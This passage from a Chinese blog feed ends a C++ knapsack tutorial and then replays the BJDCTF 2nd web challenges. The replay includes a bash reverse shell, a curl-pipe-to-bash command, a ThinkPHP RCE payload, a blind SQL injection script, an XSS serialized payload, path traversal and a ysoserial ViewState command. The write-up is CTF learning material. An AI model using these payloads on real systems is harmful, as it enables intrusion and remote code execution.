class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;w[i]);<span class="comment">//骨骼值 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;v[i]);<span class="comment">//体积 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=m;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j&gt;=v[i])</span><br><span class="line">dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j-v[i]]+w[i]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">dp[i][j]=dp[i<span class="number">-1</span>][j];<span class="comment">//保留之前的状态 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%2d "</span>,dp[n][m]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><p>和二维数组的差不多，不过就是把二维保存的值放到一维数组中<br>状态转移方程<code>dp[j]=max(dp[j],dp[j-v[i]]+w[i]);</code>,保证每轮和上轮可以用的比，保证3比2，2比1。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,t;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">1100</span>],w[<span class="number">1100</span>],v[<span class="number">1100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</span><br><span class="line"><span class="keyword">while</span>(t--)&#123;</span><br><span class="line"><span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;w[i]);     <span class="comment">//骨骼值</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;v[i]);     <span class="comment">//体积</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=m;j&gt;=v[i];j--)&#123;       </span><br><span class="line">dp[j]=<span class="built_in">max</span>(dp[j],dp[j-v[i]]+w[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,dp[m]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>如果有说错的地方，欢迎指错~~</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF-2ndWEB复现</title>
      <link href="/2020/03/28/BJDCTF-2nd/"/>
      <url>/2020/03/28/BJDCTF-2nd/</url>
      
        <content type="html"><![CDATA[<p>记录一下，以后忘记了还能看看</p><a id="more"></a><h2 id="fake-google-飞机票"><a href="#fake-google-飞机票" class="headerlink" title="fake google-飞机票"></a><a href="https://chen.oinsm.com/2020/03/27/%E6%B5%85%E8%B0%88ssti%E6%B3%A8%E5%85%A5-flask/#more" target="_blank" rel="noopener">fake google-飞机票</a></h2><h2 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h2><ul><li>.index.php.swp源码泄露</li></ul><p>一进去提示我们：<code>how can i give you source code? .swp?!</code>,获取源码后，利用vim再把它改回去就行，直接打开会乱码:<code>vim -r index.php.swp</code>恢复。</p><p><img src="/1.jpg" alt="vim"></p><p>因为exec()无回显，而且没有禁curl。所以可以反弹shell~~</p><ul><li>先查看ip地址<code>ifconfig</code><br><img src="/2.jpg"></li><li>进入&#x2F;var&#x2F;www&#x2F;html写一个txt文件。<br><img src="/3.jpg"></li><li><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>ip就是本地ip,端口随便写一个</li><li>监听端口1234</li><li><code>nc -lvp 1234</code></li><li>再post一个girlfriend的值</li><li><code>girl_friend=curl 174.1.145.235/b.txt|bash</code><br><img src="/4.jpg" alt="hackbar"><br><img src="/5.jpg"></li><li>直接cat &#x2F;flag是不会出来的</li><li><code>grep -r &quot;flag{&quot; /etc</code><br> <img src="/6.jpg"></li></ul><h2 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h2><p>题目题是thinkphp5,拿通用thinkphp5的payload打了下，然后发现版本5.0.23<br><img src="/7.jpg"></p><p>然后拿5.0.23打了下，没看到flag，还以为我没打通,结果在最上面。。<br><img src="/8.jpg"></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">index</span>.php?s=captcha</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">server</span>[<span class="title">REQUEST_METHOD</span>]=<span class="title">cat</span> /<span class="title">flag</span></span></span><br></pre></td></tr></table></figure><h2 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h2><p>hint.txt有语句提示：<code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code><br>对sql的注入还不太了解，放一下<a href="https://blog.csdn.net/SopRomeo/article/details/105123395" target="_blank" rel="noopener">大师傅</a>的二分注入</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="attr">url</span> = <span class="string">"http://523c9df3-1d44-44e8-bcc5-2a8ad35c3ff4.node3.buuoj.cn/"</span></span><br><span class="line"><span class="attr">temp</span> = &#123;&#125;</span><br><span class="line"><span class="attr">password</span> = <span class="string">""</span></span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    <span class="attr">low</span> = <span class="number">32</span></span><br><span class="line">    <span class="attr">high</span> =<span class="number">128</span></span><br><span class="line">    <span class="attr">mid</span> = (low+high)//<span class="number">2</span></span><br><span class="line">    while(low&lt;high):</span><br><span class="line">        <span class="attr">payload</span> = '^ (ascii(substr((password),%d,<span class="number">1</span>))&gt;%d)<span class="comment">#' % (i,mid)</span></span><br><span class="line">        <span class="attr">temp=&#123;"username":"admin\\","password":</span> payload&#125;</span><br><span class="line">        <span class="attr">r</span> = requests.post(url,<span class="attr">data=temp)</span></span><br><span class="line">        print(low,high,mid,<span class="string">":"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"P3rh4ps"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="attr">low</span> = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="attr">high</span> = mid</span><br><span class="line">        <span class="attr">mid</span> =(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="attr">mid</span> ==<span class="number">32</span> <span class="literal">or</span> <span class="attr">mid</span> ==<span class="number">127</span>):</span><br><span class="line">        break</span><br><span class="line">    password +=chr(mid)</span><br><span class="line">    print(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"password="</span>,password)</span><br></pre></td></tr></table></figure><p>二分注入还是快的&#x3D; &#x3D;</p><h2 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h2><p>dirb扫一下，发现有git漏洞<br><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2" target="_blank" rel="noopener">反序列化之PHP原生类的利用</a><br>也是第一次接触到反序列化原生类</p><p>利用buu里面自带的内网xss，搞得。</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Exception(<span class="string">"&lt;script src=http://xss.buuoj.cn/bL6BFw&gt;&lt;/script&gt;"</span>);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">序列化：</span><br><span class="line">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A48%3A%22%3Cscript+src%3Dhttp%3A%2F%2Fxss.buuoj.cn%2FbL6BFw%3E%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A3%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p><img src="/9.jpg"></p><h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>抓包请求下发现L0g1n.php。<br>然后套娃：<br><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank" rel="noopener">headers信息</a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">改cookie时间</span><br><span class="line">Client-ip:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>       <span class="comment">//这里XFF用不了</span></span><br><span class="line">Referer:gem-love.com     <span class="comment">//来源地址</span></span><br><span class="line">User-Agent:Commodore <span class="number">64</span>  <span class="comment">//使用的系统</span></span><br><span class="line"><span class="keyword">from</span>:<span class="symbol">root@</span>gem-love.com   <span class="comment">//请求方邮箱</span></span><br><span class="line">via:y1ng.vip             <span class="comment">//请求方代理</span></span><br></pre></td></tr></table></figure><h2 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h2><p id="div-border-left-blue">一贯尿性= =。header里面有信息,提示了home.php,robots里还提示了admin.php,但是只允许本地访问。<br>home.php里可以用伪协议读取system.php的源码，如果输入了其他的后头会拼接.fxxkyou!</p>![](10.jpg)<p><code>home.php?file=php://filter/read=convert.base64-encode/resource=system</code></p><p>base64解密后得到源码，代码审计</p><h3 id="system-php"><a href="#system-php" class="headerlink" title="system.php"></a>system.php</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'y1ng'</span>]) || $_COOKIE[<span class="string">'y1ng'</span>] !== sha1(md5(<span class="string">'y1ng'</span>)))&#123;        <span class="comment">//检查cookie</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">    header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$str2 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ '</span>;</span></span><br><span class="line"><span class="php">$str3 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ '</span>;</span></span><br><span class="line"><span class="php">$str4 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ '</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$filter1 = <span class="string">'/^http:\/\/127\.0\.0\.1\//i'</span>;           <span class="comment">//前面必须是127.0.0.1</span></span></span><br><span class="line"><span class="php">$filter2 = <span class="string">'/.?f.?l.?a.?g.?/i'</span>;                     <span class="comment">//不能包含flag</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q3'</span>]) ) &#123;</span></span><br><span class="line"><span class="php">    $url = $_POST[<span class="string">'q2'</span>].<span class="string">".y1ng.txt"</span>;</span></span><br><span class="line"><span class="php">    $method = $_POST[<span class="string">'q3'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $str1 = <span class="string">"~$ python fuck.py -u \""</span>.$url .<span class="string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $str1;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>($str2);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>($str3);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (!preg_match(<span class="string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="string">'/^POST/i'</span>, $method)) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>($str4);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $detect = @file_get_contents($url, <span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">print</span>(sprintf(<span class="string">"$url method&amp;content_size:$method%d"</span>, $detect));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>q1无限制</li><li>q2传<code>http://127.0.0.1/admin.php?a=</code>把后面衔接的.y1ng.txt接过去。</li><li>q3传GET或者POST，但是因为后面输出是%d是个整数,要对他进行转义利用%%转义把他转为%号加d:<code>GET%s%</code></li></ul><h3 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php">$f1ag = <span class="string">'f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;'</span>; <span class="comment">//fake</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span>&#123;</span></span><br><span class="line"><span class="php">    $method = <span class="string">'AES-128-CBC'</span>;</span></span><br><span class="line"><span class="php">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'your_ip_address'</span>]) &amp;&amp; $_COOKIE[<span class="string">'your_ip_address'</span>] === md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_COOKIE[<span class="string">'y1ng'</span>] === sha1(md5(<span class="string">'y1ng'</span>)))</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ( $_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span> ) &#123;             <span class="comment">//检查是否是本地</span></span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is "</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$_SESSION[<span class="string">'user'</span>] = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'decrypt'</span>])) &#123;</span></span><br><span class="line"><span class="php">    $decr = $_GET[<span class="string">'decrypt'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (Check())&#123;                       <span class="comment">//检查cookie</span></span></span><br><span class="line"><span class="php">        $data = $_SESSION[<span class="string">'secret'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">include</span> <span class="string">'flag_2sln2ndln2klnlksnf.php'</span>;</span></span><br><span class="line"><span class="php">        $cipher = aesEn($data, <span class="string">'y1ng'</span>);              <span class="comment">//调用aesEn</span></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">'爬'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span></span><br><span class="line"><span class="php">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span></span><br><span class="line"><span class="php">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span></span><br><span class="line"><span class="php">    $_SESSION[<span class="string">'secret'</span>] = bin2hex(random_bytes($length));</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p id="div-border-left-red">只要完成前面的if，所以要check()成立，并且`$decr===$cipher`<br>$cipher = aesEn($data, 'y1ng'); 只要令他返回的值相等就行</p>cookie访问之前的页面就会自动获取了<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'your_ip_address'</span>]) &amp;&amp; $_COOKIE[<span class="string">'your_ip_address'</span>] === md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_COOKIE[<span class="string">'y1ng'</span>] === sha1(md5(<span class="string">'y1ng'</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>就是前面得174.0.222.75.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5(<span class="string">'174.0.222.75'</span>, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cipher = aesEn(<span class="string">'NULL'</span>, <span class="string">'y1ng'</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode($cipher); <span class="comment">//70klfZeYC+WlC045CcKhtg==    要将最后的值转码</span></span><br></pre></td></tr></table></figure><p>如果运行的时候报<b>Call to undefined function openssl_encrypt()</b>错，在php.ini搜索下<code>;extension=php_openssl.dll</code>去掉前面得分号即可。或者直接<a href="https://code.y444.cn/" target="_blank" rel="noopener">在线运行代码</a>。<br><img src="/11.jpg" alt="之前cookie都忘记带值了，我晕~"></p><h2 id="EasyAspDotNet"><a href="#EasyAspDotNet" class="headerlink" title="EasyAspDotNet"></a>EasyAspDotNet</h2><p>赵师傅的题真顶。<br>了解可以看这篇文章：<a href="https://www.4hou.com/posts/GYq7" target="_blank" rel="noopener">如何借助ViewState在ASP.NET中实现反序列化漏洞利用</a><br>攻击的文章：<a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門</a><br>进去之后发现图片路径：<code>path=4.gif</code>,看到别的大佬说有文件包含，读取web.config文件。<br>一个个试直到：<code>path=../../web.config</code><br>发现被当作图片读取，curl下载。</p><p><img src="/12.jpg" alt="构造目录穿越读取web.config成功"></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://65b7c96b<span class="string">-2005</span><span class="string">-4</span>b6b-ba0f<span class="string">-485176</span>af77c7.node3.buuoj.cn/ImgLoad.aspx?path=../../web.config</span><br></pre></td></tr></table></figure><p><a href="https://github.com/ChenZIDu/EasyAspDotNet.git" target="_blank" rel="noopener">ExploitClass.cs、System.Web.dll、System.dll文件</a><br><a href="https://github.com/pwntester/ysoserial.net/releases/tag/v1.32" target="_blank" rel="noopener">ysoserial.net,直接下载带exe的</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c <span class="string">"ExploitClass.cs;./System.dll;./System.Web.dll"</span> <span class="attribute">--generator</span>=<span class="string">"CA0B0334"</span> <span class="attribute">--validationalg</span>=<span class="string">"SHA1"</span> <span class="attribute">--validationkey</span>=<span class="string">"47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9"</span> <span class="attribute">decryptionKey</span>=<span class="string">"B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5"</span></span><br></pre></td></tr></table></figure><p><img src="/13.jpg" alt="Powershell"></p><p><img src="/14.jpg" alt="Postman"></p><p id="div-border-left-red">如果用brup注意__VIEWSTATE参数的编码问题</p><p><img src="/15.jpg" alt="Postman"></p><p>拖了好多天，终于复现完了，明天可以做别的事情了~~~~</p><hr><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.zhaoj.in/read-6497.html" target="_blank" rel="noopener">BJDCTF 2nd EasyAspDotNet WriteUp</a><br><a href="https://www.gem-love.com/ctf/2097.html#DuangShell" target="_blank" 